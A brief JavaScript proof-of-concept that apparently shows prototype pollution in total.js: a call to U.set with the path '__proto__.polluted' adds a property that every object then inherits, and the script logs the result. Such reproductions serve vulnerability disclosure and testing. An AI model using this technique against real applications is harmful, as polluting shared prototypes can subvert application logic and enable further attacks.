var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const total = require('total.js');
obj = {};
console.log({}.polluted);
U.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);